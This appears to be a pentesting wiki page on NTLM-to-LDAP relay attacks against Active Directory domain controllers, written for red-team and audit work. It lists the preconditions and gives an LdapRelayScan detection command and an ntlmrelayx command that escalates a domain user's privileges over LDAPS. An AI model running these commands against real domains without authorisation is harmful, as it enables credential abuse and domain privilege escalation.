# LDAP Relaying

LDAP Relaying attacks can make use of NTLM authentication. Similar to [SMB Relaying](smb-relaying.md), an attacker who captures credentials via [MITM6](../networks/ipv6.md) or Responder can then relay them to a domain controller, targeting LDAP.&#x20;

It should be noted that the following two defaults need to be set in order for this to be exploited:

* LDAP Signing Disabled
* [LDAP Channel Binding Disabled](https://support.microsoft.com/en-us/topic/use-the-ldapenforcechannelbinding-registry-entry-to-make-ldap-authentication-over-ssl-tls-more-secure-e9ecfa27-5e57-8519-6ba3-d2c06b21812e)

### Identification

#### LDAPRelayScan

[LDAPRelayScan](https://github.com/zyn3rgy/LdapRelayScan) can be utilized to identify whether LDAP Signing and/or LDAP Channel Binding are enabled or not.

```bash
# Generic usage of LdapRelayScan.py  
LdapRelayScan.py -u $user -p $password -dc-ip $dcipaddress -method BOTH
```

### Exploitation

{% tabs %}
{% tab title="Escalate" %}
Relay captured credentials to LDAPS and escalate the privileges of a specified domain user.&#x20;

```bash
# Relay authentication over LDAPS and attempt to escalate privileges
ntlmrelayx.py -t ldaps://$dcip --escalate-user $username
```
{% endtab %}

{% tab title="Computer Creation" %}
Create a new domain computer by abusing the default attribute
{% endtab %}
{% endtabs %}

### References

{% embed url="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/" %}

{% embed url="https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/adversary-in-the-middle/ldap-relay" %}
